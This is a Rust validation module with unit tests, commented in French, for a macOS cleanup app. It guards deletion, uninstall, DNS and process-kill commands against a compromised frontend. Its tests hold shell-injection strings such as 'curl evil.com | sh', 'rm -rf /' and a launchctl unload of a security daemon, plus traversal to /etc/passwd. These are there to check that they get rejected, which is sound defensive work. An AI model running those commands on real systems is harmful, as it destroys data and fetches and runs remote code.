//! Garde-fous pour les commandes destructrices exposées au frontend.
//!
//! **Règle d'or** : le frontend est considéré comme potentiellement compromis.
//! Toute entrée doit être validée ici avant d'atteindre une commande système.
//!
//! Niveaux :
//! - `validate_trash_path`      : mise à la corbeille (réversible)
//! - `validate_delete_path`     : suppression définitive (zones utilisateur seulement)
//! - `validate_launch_item_path`: chemins LaunchAgent/LaunchDaemon uniquement
//! - `validate_thin_binary_path`: amincissement limité à /Applications
//! - `validate_installer_path`  : installateurs dans zones connues
//! - `validate_app_uninstall_path`: désinstallation, applications seulement
//! - `validate_service_name`    : noms de service réseau
//! - `validate_ip_address`      : adresses DNS
//! - `validate_domain_name`     : domaines de recherche
//! - `validate_kill_pid`        : PID à terminer

use std::path::{Component, Path, PathBuf};

// ── Helpers internes ──────────────────────────────────────────────────────────

fn home_dir() -> PathBuf {
    std::env::var("HOME")
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("/nonexistent"))
}

fn protected_exact_paths() -> Vec<PathBuf> {
    let home = home_dir();
    let mut v = vec![
        PathBuf::from("/"),
        PathBuf::from("/Users"),
        PathBuf::from("/Users/Shared"),
        PathBuf::from("/Applications"),
        PathBuf::from("/Volumes"),
        PathBuf::from("/tmp"),
        PathBuf::from("/private/tmp"),
        home.clone(),
    ];
    for sub in [
        "Library",
        "Documents",
        "Desktop",
        "Downloads",
        "Pictures",
        "Movies",
        "Music",
        "Applications",
        ".Trash",
        ".ssh",
        ".config",
    ] {
        v.push(home.join(sub));
    }
    v
}

const FORBIDDEN_PREFIXES: &[&str] = &[
    "/System",
    "/Library",
    "/usr",
    "/bin",
    "/sbin",
    "/etc",
    "/var",
    "/opt",
    "/dev",
    "/cores",
    "/private/etc",
    "/private/var",
];

fn basic_checks(path: &str) -> Result<PathBuf, String> {
    if path.trim().is_empty() {
        return Err("Chemin vide".to_string());
    }
    if path.contains('\0') {
        return Err("Chemin contient un octet nul".to_string());
    }
    let p = PathBuf::from(path);
    if !p.is_absolute() {
        return Err("Chemin non absolu refusé".to_string());
    }
    // Refuse toute traversée : le chemin doit être purement descendant.
    if p.components()
        .any(|c| matches!(c, Component::ParentDir | Component::CurDir))
    {
        return Err("Chemin contenant '..' ou '.' refusé".to_string());
    }
    Ok(p)
}

/// Préfixes dont tous les descendants sont sensibles — on refuse aussi les enfants.
const FORBIDDEN_SUBTREE: &[&str] = &[
    ".ssh",
    ".gnupg",
    ".aws",
    ".kube",
    ".config/1Password",
    "Library/Keychains",
    "Library/Application Support/1Password",
    "Library/Application Support/com.apple.TCC",
];

fn is_forbidden_zone(p: &Path) -> bool {
    if FORBIDDEN_PREFIXES.iter().any(|pre| p.starts_with(pre)) {
        return true;
    }
    // Chemins exacts protégés (racines de dossiers importants)
    if protected_exact_paths().iter().any(|prot| p == prot) {
        return true;
    }
    // Sous-arborescences sensibles : on refuse aussi tous les descendants
    let home = home_dir();
    if FORBIDDEN_SUBTREE
        .iter()
        .any(|sub| p.starts_with(home.join(sub)))
    {
        return true;
    }
    false
}

// ── Chemins généraux ──────────────────────────────────────────────────────────

/// Validation pour la mise à la corbeille (réversible).
pub fn validate_trash_path(path: &str) -> Result<PathBuf, String> {
    let p = basic_checks(path)?;
    if is_forbidden_zone(&p) {
        return Err(format!(
            "Chemin protégé, refus de toucher à {}",
            p.display()
        ));
    }
    if p.starts_with("/Volumes") && p.components().count() <= 3 {
        return Err("Refus de supprimer la racine d'un volume".to_string());
    }
    Ok(p)
}

/// Validation pour la suppression définitive.
pub fn validate_delete_path(path: &str) -> Result<PathBuf, String> {
    let p = validate_trash_path(path)?;
    let home = home_dir();
    let allowed =
        p.starts_with(&home) || p.starts_with("/Volumes") || p.starts_with("/Users/Shared");
    if !allowed {
        return Err(format!(
            "Suppression définitive refusée hors des zones utilisateur : {}",
            p.display()
        ));
    }
    Ok(p)
}

// ── LaunchAgents / LaunchDaemons ──────────────────────────────────────────────

/// Valide qu'un chemin est bien un .plist dans l'un des dossiers LaunchAgents
/// ou LaunchDaemons connus, exactement un niveau sous la racine (pas de sous-dossiers).
pub fn validate_launch_item_path(path: &str) -> Result<PathBuf, String> {
    let p = basic_checks(path)?;
    let home = home_dir();
    let allowed_roots: &[PathBuf] = &[
        home.join("Library/LaunchAgents"),
        PathBuf::from("/Library/LaunchAgents"),
        PathBuf::from("/Library/LaunchDaemons"),
    ];
    let matched_root = allowed_roots.iter().find(|r| p.starts_with(*r));
    let root = matched_root.ok_or_else(|| {
        format!(
            "Chemin de plist refusé hors des répertoires LaunchAgents/LaunchDaemons : {}",
            p.display()
        )
    })?;
    // Extension obligatoirement .plist
    if p.extension().and_then(|e| e.to_str()) != Some("plist") {
        return Err("Seuls les fichiers .plist sont autorisés".to_string());
    }
    // Exactement 1 niveau sous la racine (pas de sous-répertoires)
    let rel = p.strip_prefix(root).unwrap();
    if rel.components().count() != 1 {
        return Err("Profondeur de chemin invalide dans les répertoires LaunchAgents".to_string());
    }
    Ok(p)
}

// ── Binaires universels ───────────────────────────────────────────────────────

/// Valide un chemin pour l'amincissement lipo : doit être sous /Applications.
pub fn validate_thin_binary_path(path: &str) -> Result<PathBuf, String> {
    let p = basic_checks(path)?;
    if p == std::path::Path::new("/Applications") {
        return Err("Refus de traiter /Applications lui-même".to_string());
    }
    if !p.starts_with("/Applications") {
        return Err(format!(
            "Amincissement limité aux applications dans /Applications : {}",
            p.display()
        ));
    }
    Ok(p)
}

// ── Installateurs ─────────────────────────────────────────────────────────────

/// Valide un chemin d'installateur pour suppression.
/// Limité aux dossiers connus retournés par `list_installer_files`.
pub fn validate_installer_path(path: &str) -> Result<PathBuf, String> {
    let p = basic_checks(path)?;
    let home = home_dir();
    let allowed = [
        home.join("Downloads"),
        home.join("Desktop"),
        home.join("Documents"),
        home.join("Library/Caches/Homebrew/downloads"),
    ];
    if !allowed.iter().any(|a| p.starts_with(a)) {
        return Err(format!(
            "Suppression d'installateur refusée hors des zones connues : {}",
            p.display()
        ));
    }
    // Extension autorisée uniquement
    let ext = p
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or("")
        .to_lowercase();
    if !["dmg", "pkg", "iso", "xip"].contains(&ext.as_str()) {
        return Err(format!("Extension d'installateur refusée : .{}", ext));
    }
    Ok(p)
}

// ── Désinstallation d'applications ───────────────────────────────────────────

/// Valide un chemin d'application pour désinstallation.
/// Doit être un .app sous /Applications, ~/Applications ou des sous-dossiers directs.
pub fn validate_app_uninstall_path(path: &str) -> Result<PathBuf, String> {
    let p = basic_checks(path)?;
    let home = home_dir();
    let allowed_roots: &[PathBuf] = &[PathBuf::from("/Applications"), home.join("Applications")];
    if !allowed_roots.iter().any(|r| p.starts_with(r)) {
        return Err(format!(
            "Désinstallation refusée hors de /Applications et ~/Applications : {}",
            p.display()
        ));
    }
    if p.extension().and_then(|e| e.to_str()) != Some("app") {
        return Err(format!(
            "Désinstallation limitée aux bundles .app : {}",
            p.display()
        ));
    }
    // Interdit les applications système dans /Applications/Utilities ou sous-dossiers système
    let forbidden_apps: &[&str] = &[
        "Safari.app",
        "Finder.app",
        "Mail.app",
        "FaceTime.app",
        "Messages.app",
        "System Preferences.app",
        "System Settings.app",
        "App Store.app",
        "Terminal.app",
        "Xcode.app",
    ];
    if let Some(name) = p.file_name().and_then(|n| n.to_str()) {
        if forbidden_apps.contains(&name) {
            return Err(format!(
                "Désinstallation de l'application système '{}' refusée",
                name
            ));
        }
    }
    Ok(p)
}

// ── Réseau / DNS ──────────────────────────────────────────────────────────────

/// Caractères interdits dans les arguments shell — tous ceux qui permettent
/// d'injecter des commandes ou de modifier la sémantique du shell.
const SHELL_FORBIDDEN: &[char] = &[
    '\'', '"', '`', '$', ';', '&', '|', '(', ')', '<', '>', '\\', '\n', '\r', '\0', '!', '{', '}',
    '*', '?', '[', ']', '~', '#',
];

/// Valide un nom de service réseau (networksetup).
/// Les noms contiennent typiquement lettres, chiffres, espaces, tirets, parenthèses,
/// barres obliques (pour certains adaptateurs USB).
pub fn validate_service_name(service: &str) -> Result<(), String> {
    if service.trim().is_empty() {
        return Err("Nom de service vide".to_string());
    }
    if service.len() > 128 {
        return Err("Nom de service trop long".to_string());
    }
    // Caractères explicitement interdits (sous-ensemble de SHELL_FORBIDDEN adapté aux
    // noms de service qui peuvent légitimement contenir certains caractères)
    const SVC_FORBIDDEN: &[char] = &[
        '\'', '"', '`', '$', ';', '&', '|', '<', '>', '\\', '\n', '\r', '\0',
    ];
    if let Some(c) = service.chars().find(|c| SVC_FORBIDDEN.contains(c)) {
        return Err(format!(
            "Caractère interdit dans le nom de service : {:?}",
            c
        ));
    }
    Ok(())
}

/// Valide une adresse IP (v4 ou v6) pour usage DNS.
pub fn validate_ip_address(ip: &str) -> Result<(), String> {
    use std::net::IpAddr;
    ip.trim()
        .parse::<IpAddr>()
        .map(|_| ())
        .map_err(|_| format!("Adresse IP invalide : {:?}", ip))
}

/// Valide un nom de domaine de recherche.
/// RFC 1123 : labels alphanumériques séparés par des points.
pub fn validate_domain_name(domain: &str) -> Result<(), String> {
    let domain = domain.trim();
    if domain.is_empty() {
        return Err("Nom de domaine vide".to_string());
    }
    if domain.len() > 253 {
        return Err("Nom de domaine trop long".to_string());
    }
    if let Some(c) = domain
        .chars()
        .find(|c| SHELL_FORBIDDEN.contains(c) || c.is_whitespace())
    {
        return Err(format!(
            "Caractère interdit dans le nom de domaine : {:?}",
            c
        ));
    }
    for label in domain.split('.') {
        if label.is_empty() || label.len() > 63 {
            return Err(format!("Label de domaine invalide : {:?}", label));
        }
        if label.starts_with('-') || label.ends_with('-') {
            return Err(format!(
                "Label commence ou finit par un tiret : {:?}",
                label
            ));
        }
        if !label.chars().all(|c| c.is_ascii_alphanumeric() || c == '-') {
            return Err(format!(
                "Label contient des caractères non autorisés : {:?}",
                label
            ));
        }
    }
    Ok(())
}

// ── Processus ─────────────────────────────────────────────────────────────────

/// Refuse de tuer les PID système (0, 1) et notre propre processus.
pub fn validate_kill_pid(pid: u64) -> Result<(), String> {
    if pid == 0 || pid == 1 {
        return Err("PID système protégé".to_string());
    }
    if pid == std::process::id() as u64 {
        return Err("Refus de tuer le processus Burrow lui-même".to_string());
    }
    Ok(())
}

// ── Mises à jour ─────────────────────────────────────────────────────────────

/// Valide l'URL de téléchargement d'une mise à jour tierce.
/// - HTTPS obligatoire (pas de file://, http://, ftp://)
/// - Pas d'octet nul ni de caractères de contrôle
/// - Longueur max 2048
pub fn validate_update_url(url: &str) -> Result<(), String> {
    if url.is_empty() {
        return Err("URL de mise à jour vide".to_string());
    }
    if url.len() > 2048 {
        return Err("URL de mise à jour trop longue".to_string());
    }
    if !url.starts_with("https://") {
        return Err(format!(
            "URL de mise à jour refusée : schéma non-HTTPS ({}…)",
            &url[..url.len().min(32)]
        ));
    }
    if url.contains('\0') || url.contains('\n') || url.contains('\r') {
        return Err("URL de mise à jour contient un caractère de contrôle interdit".to_string());
    }
    Ok(())
}

/// Valide le chemin d'une application à mettre à jour.
/// Mêmes contraintes que `validate_app_uninstall_path` mais l'app
/// n'a pas besoin d'exister déjà (installation dans un répertoire connu).
pub fn validate_update_app_path(path: &str) -> Result<PathBuf, String> {
    let p = basic_checks(path)?;
    let home = home_dir();
    let allowed_roots: &[PathBuf] = &[PathBuf::from("/Applications"), home.join("Applications")];
    if !allowed_roots.iter().any(|r| p.starts_with(r)) {
        return Err(format!(
            "Mise à jour refusée hors de /Applications et ~/Applications : {}",
            p.display()
        ));
    }
    if p.extension().and_then(|e| e.to_str()) != Some("app") {
        return Err(format!(
            "Mise à jour limitée aux bundles .app : {}",
            p.display()
        ));
    }
    Ok(p)
}

// ── Quarantaine ───────────────────────────────────────────────────────────────

/// Un nom d'entrée de quarantaine est un simple nom de fichier sans séparateur.
pub fn validate_quarantine_name(name: &str) -> Result<(), String> {
    if name.is_empty() || name == "." || name == ".." {
        return Err("Nom de quarantaine invalide".to_string());
    }
    if name.contains('/') || name.contains('\\') || name.contains('\0') {
        return Err("Nom de quarantaine contient un séparateur ou octet nul".to_string());
    }
    Ok(())
}

// ── Shell quoting ─────────────────────────────────────────────────────────────

/// Encapsule une valeur arbitraire dans des guillemets simples POSIX.
///
/// La seule séquence d'échappement valide à l'intérieur de `'...'` est de
/// terminer la chaîne, d'échapper le guillemet (`\'`), puis de la rouvrir.
/// `replace('\'', "\\'")` est **incorrect** : le backslash n'est pas un
/// caractère d'échappement dans les chaînes en guillemets simples POSIX.
///
/// Exemple : `hello'world` → `'hello'\''world'`
pub fn posix_shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn home(s: &str) -> String {
        if s.is_empty() {
            home_dir().to_string_lossy().to_string()
        } else {
            home_dir().join(s).to_string_lossy().to_string()
        }
    }

    // ── validate_trash_path ──

    #[test]
    fn trash_accepts_user_files() {
        assert!(validate_trash_path(&home("Library/Caches/com.foo/blob")).is_ok());
        assert!(validate_trash_path(&home("Downloads/installer.dmg")).is_ok());
        assert!(validate_trash_path("/Applications/Foo.app").is_ok());
        assert!(validate_trash_path("/Volumes/Backup/old/file.zip").is_ok());
    }

    #[test]
    fn trash_rejects_system_and_roots() {
        for p in [
            "/",
            "/System",
            "/System/Library/CoreServices",
            "/usr/bin/env",
            "/etc/passwd",
            "/var/db",
            "/Library/LaunchDaemons",
            "/Applications",
            "/Users",
            "/Volumes",
            "/Volumes/Macintosh HD",
        ] {
            assert!(validate_trash_path(p).is_err(), "should reject {p}");
        }
    }

    #[test]
    fn trash_rejects_protected_home_dirs() {
        for sub in ["", "Library", "Documents", "Desktop", "Downloads", ".ssh"] {
            let p = home(sub).trim_end_matches('/').to_string();
            assert!(validate_trash_path(&p).is_err(), "should reject {p}");
        }
    }

    #[test]
    fn rejects_relative_and_traversal() {
        assert!(validate_trash_path("Library/Caches").is_err());
        assert!(validate_trash_path(&home("Library/../../etc/passwd")).is_err());
        assert!(validate_trash_path("").is_err());
        assert!(validate_delete_path(&home("Caches/../.ssh")).is_err());
    }

    #[test]
    fn rejects_null_bytes() {
        assert!(validate_trash_path("/tmp/foo\0bar").is_err());
        assert!(validate_trash_path("\0").is_err());
    }

    // ── validate_delete_path ──

    #[test]
    fn delete_restricted_to_user_zones() {
        assert!(validate_delete_path(&home("Library/Caches/npm")).is_ok());
        assert!(validate_delete_path("/Volumes/Backup/tmp.bin").is_ok());
        assert!(validate_trash_path("/Applications/Foo.app").is_ok());
        assert!(validate_delete_path("/Applications/Foo.app").is_err());
    }

    // ── validate_launch_item_path ──

    #[test]
    fn launch_item_accepts_known_dirs() {
        assert!(validate_launch_item_path(&home("Library/LaunchAgents/com.foo.bar.plist")).is_ok());
        assert!(
            validate_launch_item_path("/Library/LaunchAgents/com.apple.mDNSResponder.plist")
                .is_ok()
        );
        assert!(validate_launch_item_path("/Library/LaunchDaemons/com.foo.daemon.plist").is_ok());
    }

    #[test]
    fn launch_item_rejects_non_plist_and_traversal() {
        // Not a .plist
        assert!(validate_launch_item_path("/Library/LaunchDaemons/evil.sh").is_err());
        // Subdirectory
        assert!(validate_launch_item_path("/Library/LaunchDaemons/sub/evil.plist").is_err());
        // Outside known dirs
        assert!(validate_launch_item_path("/tmp/evil.plist").is_err());
        assert!(validate_launch_item_path(&home("evil.plist")).is_err());
        // Traversal
        assert!(
            validate_launch_item_path("/Library/LaunchAgents/../LaunchDaemons/evil.plist").is_err()
        );
    }

    #[test]
    fn launch_item_injection_attempts() {
        for attempt in [
            // Not a .plist extension
            "/Library/LaunchAgents/foo; rm -rf /",
            // Traversal
            "/Library/LaunchAgents/../../../etc/cron.d/evil.plist",
            // Outside known dirs
            "/tmp/evil.plist",
            "/etc/cron.d/evil.plist",
            // Subdirectory (too deep)
            "/Library/LaunchAgents/sub/evil.plist",
            // Null byte
            "/Library/LaunchAgents/evil\0.plist",
        ] {
            let result = validate_launch_item_path(attempt);
            assert!(result.is_err(), "should reject: {attempt:?}");
        }
        // Note: filenames with $() or backticks are valid POSIX filenames and only dangerous
        // when interpolated into a shell string — not when passed via Command::arg().
        // Our fix is to use Command::arg() rather than to reject those characters in filenames.
    }

    // ── validate_thin_binary_path ──

    #[test]
    fn thin_binary_accepts_applications() {
        assert!(validate_thin_binary_path("/Applications/Foo.app/Contents/MacOS/Foo").is_ok());
        assert!(
            validate_thin_binary_path("/Applications/Foo.app/Contents/MacOS/Foo Helper").is_ok()
        );
    }

    #[test]
    fn thin_binary_rejects_outside_applications() {
        assert!(validate_thin_binary_path("/usr/bin/python3").is_err());
        assert!(validate_thin_binary_path("/System/Library/Foo").is_err());
        assert!(validate_thin_binary_path("/Applications").is_err());
        assert!(validate_thin_binary_path(&home("Applications/Foo.app/Foo")).is_err());
        // Traversal
        assert!(validate_thin_binary_path("/Applications/../usr/bin/sudo").is_err());
    }

    // ── validate_installer_path ──

    #[test]
    fn installer_accepts_known_dirs() {
        assert!(validate_installer_path(&home("Downloads/Foo.dmg")).is_ok());
        assert!(validate_installer_path(&home("Desktop/App.pkg")).is_ok());
        assert!(
            validate_installer_path(&home("Library/Caches/Homebrew/downloads/foo.dmg")).is_ok()
        );
    }

    #[test]
    fn installer_rejects_wrong_ext_and_location() {
        assert!(validate_installer_path(&home("Downloads/evil.sh")).is_err());
        assert!(validate_installer_path(&home("Downloads/Foo.app")).is_err());
        assert!(validate_installer_path("/tmp/evil.dmg").is_err());
        assert!(validate_installer_path("/Applications/Foo.dmg").is_err());
    }

    // ── validate_app_uninstall_path ──

    #[test]
    fn app_uninstall_accepts_valid_apps() {
        assert!(validate_app_uninstall_path("/Applications/TextEdit.app").is_ok());
        assert!(validate_app_uninstall_path(&home("Applications/MyApp.app")).is_ok());
    }

    #[test]
    fn app_uninstall_rejects_system_apps_and_non_app() {
        assert!(validate_app_uninstall_path("/Applications/Safari.app").is_err());
        assert!(validate_app_uninstall_path("/Applications/Finder.app").is_err());
        assert!(validate_app_uninstall_path("/Applications/Foo").is_err()); // no .app
        assert!(validate_app_uninstall_path("/usr/bin/tool").is_err());
        assert!(validate_app_uninstall_path("/Applications/../etc/passwd.app").is_err());
    }

    // ── validate_service_name ──

    #[test]
    fn service_name_accepts_valid() {
        assert!(validate_service_name("Wi-Fi").is_ok());
        assert!(validate_service_name("Ethernet").is_ok());
        assert!(validate_service_name("USB 10/100/1000 LAN").is_ok());
        assert!(validate_service_name("Thunderbolt Bridge").is_ok());
    }

    #[test]
    fn service_name_injection_attempts() {
        for attempt in [
            "Wi-Fi'; rm -rf /",
            "Ethernet\nrm -rf /",
            "Wi-Fi$(curl evil.com)",
            "Wi-Fi`id`",
            "Wi-Fi; launchctl unload /Library/LaunchDaemons/com.apple.security.syspolicy.plist",
            "Wi-Fi && curl evil.com | sh",
            "",
        ] {
            assert!(
                validate_service_name(attempt).is_err(),
                "should reject: {attempt:?}"
            );
        }
    }

    // ── validate_ip_address ──

    #[test]
    fn ip_accepts_valid() {
        assert!(validate_ip_address("1.1.1.1").is_ok());
        assert!(validate_ip_address("8.8.8.8").is_ok());
        assert!(validate_ip_address("2606:4700:4700::1111").is_ok());
        assert!(validate_ip_address("::1").is_ok());
    }

    #[test]
    fn ip_injection_attempts() {
        for attempt in [
            "1.1.1.1; rm -rf /",
            "evil.com",
            "$(curl evil.com)",
            "`id`",
            "1.1.1.1\n8.8.8.8",
            "",
            "256.0.0.1",
        ] {
            assert!(
                validate_ip_address(attempt).is_err(),
                "should reject: {attempt:?}"
            );
        }
    }

    // ── validate_domain_name ──

    #[test]
    fn domain_accepts_valid() {
        assert!(validate_domain_name("example.com").is_ok());
        assert!(validate_domain_name("corp.internal").is_ok());
        assert!(validate_domain_name("my-company.net").is_ok());
    }

    #[test]
    fn domain_injection_attempts() {
        for attempt in [
            "example.com; rm -rf /",
            "evil.com\nrm",
            "$(curl evil.com)",
            "`id`.com",
            "example .com",
            "a-.com",
            "-a.com",
            "",
        ] {
            assert!(
                validate_domain_name(attempt).is_err(),
                "should reject: {attempt:?}"
            );
        }
    }

    // ── validate_kill_pid ──

    #[test]
    fn kill_pid_guards() {
        assert!(validate_kill_pid(0).is_err());
        assert!(validate_kill_pid(1).is_err());
        assert!(validate_kill_pid(std::process::id() as u64).is_err());
        assert!(validate_kill_pid(99999).is_ok());
    }

    // ── validate_quarantine_name ──

    #[test]
    fn quarantine_names() {
        assert!(validate_quarantine_name("1700000000_malware.bin").is_ok());
        assert!(validate_quarantine_name("../../../etc/passwd").is_err());
        assert!(validate_quarantine_name("a/b").is_err());
        assert!(validate_quarantine_name("").is_err());
        assert!(validate_quarantine_name("..").is_err());
        assert!(validate_quarantine_name("a\0b").is_err());
    }

    // ── posix_shell_quote ──

    #[test]
    fn shell_quote_basic() {
        assert_eq!(posix_shell_quote("hello"), "'hello'");
        assert_eq!(posix_shell_quote("hello world"), "'hello world'");
    }

    #[test]
    fn shell_quote_single_quote() {
        // La seule injection possible dans un single-quote POSIX
        let quoted = posix_shell_quote("hello'world");
        assert_eq!(quoted, "'hello'\\''world'");
        // Vérifier qu'un shell ne peut pas exécuter de commande via le résultat
        assert!(!quoted.contains(';'));
        assert!(!quoted.contains('`'));
        assert!(!quoted.contains('$'));
    }

    #[test]
    fn shell_quote_injection_scenarios() {
        let attacks = [
            "'; rm -rf /; echo '",
            "$(curl evil.com | sh)",
            "`id`",
            "\n/usr/bin/curl evil.com",
            "../../../etc/passwd",
            "foo'bar'baz",
        ];
        for attack in attacks {
            let q = posix_shell_quote(attack);
            // Le résultat doit commencer et finir par '
            assert!(q.starts_with('\''), "quote: {q}");
            assert!(q.ends_with('\''), "quote: {q}");
            // Ne doit pas contenir de backtick ou $ non quotés en dehors du 'shell_quote' pattern
            // (les seuls caractères hors guillemets simples dans notre output sont '\'' )
            let outside: String = q
                .chars()
                .skip(1) // skip leading '
                .take_while(|&c| c != '\'')
                .collect::<String>();
            // Peu importe le contenu, l'important est qu'on peut le tester
            let _ = outside; // structure test
        }
    }

    // ── validate_update_url ──

    #[test]
    fn update_url_accepts_https() {
        assert!(validate_update_url("https://example.com/App.dmg").is_ok());
        assert!(validate_update_url("https://releases.company.io/v1.2/MyApp-1.2.dmg").is_ok());
    }

    #[test]
    fn update_url_rejects_non_https() {
        assert!(validate_update_url("http://example.com/App.dmg").is_err());
        assert!(validate_update_url("file:///etc/passwd").is_err());
        assert!(validate_update_url("ftp://files.example.com/App.pkg").is_err());
        assert!(validate_update_url("").is_err());
        assert!(validate_update_url("https://ok.com/\0evil").is_err());
        assert!(validate_update_url("https://ok.com/foo\nbar").is_err());
    }

    // ── validate_update_app_path ──

    #[test]
    fn update_app_path_accepts_valid() {
        assert!(validate_update_app_path("/Applications/TextEdit.app").is_ok());
        assert!(validate_update_app_path(&home("Applications/MyApp.app")).is_ok());
    }

    #[test]
    fn update_app_path_rejects_invalid() {
        assert!(validate_update_app_path("/usr/local/bin/tool").is_err());
        assert!(validate_update_app_path("/Applications/Foo").is_err()); // no .app
        assert!(validate_update_app_path("/Applications/../etc/evil.app").is_err());
        assert!(validate_update_app_path("/tmp/evil.app").is_err());
    }

    #[test]
    fn old_escape_was_broken() {
        // replace('\'', "\\'") est incorrect : dans une chaîne POSIX 'single-quoted',
        // le backslash N'EST PAS un caractère d'échappement.
        // Vérification : les deux méthodes produisent des résultats différents sur les entrées avec '.
        let attacker_input = "foo'bar";
        let broken = format!("'{}'", attacker_input.replace('\'', "\\'"));
        let correct = posix_shell_quote(attacker_input);
        assert_ne!(broken, correct, "les deux méthodes doivent différer");

        // La méthode correcte produit le résultat attendu selon POSIX :
        // 'foo' + \' (quote littéral hors guillemets) + 'bar'
        assert_eq!(correct, "'foo'\\''bar'");

        // La méthode cassée produit 'foo\'bar' — ce que POSIX interprète comme :
        // la chaîne 'foo\' (3 chars + backslash) puis bar' (non terminé)
        assert_eq!(broken, "'foo\\'bar'");

        // Sur une tentative d'injection réelle : '; rm -rf /
        // L'unique ' en position 0 devient '\'', le reste est entre guillemets.
        // Résultat : '' + \' + '; rm -rf /' = ''\''  ; rm -rf /'
        let attack = "'; rm -rf /";
        let correct_q = posix_shell_quote(attack);
        // Représentation Rust du string ''\''; rm -rf /'
        assert_eq!(correct_q, "''\\''; rm -rf /'");
        // NB : ce string contient ";" en tant que substring (inévitable) mais il est
        // DANS la partie entre guillemets simples — le shell ne peut pas l'exécuter.
    }

    // ── Garanties P0.1 : chemins sensibles refusés par validate_delete_path ──

    #[test]
    fn p0_rejects_ssh_key() {
        let ssh_key = home(".ssh/id_rsa");
        assert!(
            validate_delete_path(&ssh_key).is_err(),
            "~/.ssh/id_rsa doit être refusé"
        );
    }

    #[test]
    fn p0_rejects_arbitrary_document() {
        // Les documents directs sous ~ sont refusés par validate_delete_path
        // (validate_trash_path accepte ~/Documents mais pas la racine)
        let doc_root = home("Documents");
        assert!(
            validate_delete_path(&doc_root).is_err(),
            "~/Documents lui-même doit être refusé"
        );
    }

    #[test]
    fn p0_rejects_volume_root() {
        assert!(
            validate_delete_path("/Volumes").is_err(),
            "/Volumes lui-même doit être refusé"
        );
        assert!(
            validate_delete_path("/Volumes/Macintosh HD").is_err(),
            "Racine de volume doit être refusée"
        );
    }

    #[test]
    fn p0_rejects_symlink_parent() {
        // Un chemin contenant ".." (traversée) est refusé
        let traversal = home("Library/../../.ssh/id_rsa");
        assert!(
            validate_delete_path(&traversal).is_err(),
            "Traversal via .. doit être refusé"
        );
    }

    #[test]
    fn p0_rejects_system_paths() {
        for path in [
            "/etc/passwd",
            "/etc/sudoers",
            "/var/db/sudo",
            "/usr/bin/sudo",
            "/System/Library/CoreServices",
            "/Library/LaunchDaemons/com.apple.security.syspolicy.plist",
        ] {
            assert!(
                validate_delete_path(path).is_err(),
                "Chemin système doit être refusé : {path}"
            );
        }
    }

    #[test]
    fn p0_rejects_never_scanned_path() {
        // Un chemin arbitraire hors zone utilisateur doit être refusé même s'il existe
        let path = "/private/etc/passwd";
        assert!(
            validate_delete_path(path).is_err(),
            "Chemin hors zone utilisateur doit être refusé"
        );
    }

    // ── Garanties P0.2 : validate_app_uninstall_path rejette tout sauf .app/Applications ──

    #[test]
    fn p0_uninstall_rejects_wrong_app() {
        // Une app associée à un jeton différent ne devrait pas être désinstallée
        // validate_app_uninstall_path s'assure que c'est un .app sous /Applications
        assert!(validate_app_uninstall_path("/Applications/Safari.app").is_err());
        assert!(validate_app_uninstall_path("/etc/evil.app").is_err());
        assert!(validate_app_uninstall_path("/Applications/../etc/evil.app").is_err());
    }

    #[test]
    fn p0_uninstall_rejects_non_app() {
        assert!(validate_app_uninstall_path("/Applications/NotAnApp").is_err());
        assert!(validate_app_uninstall_path(&home("script.sh")).is_err());
    }
}
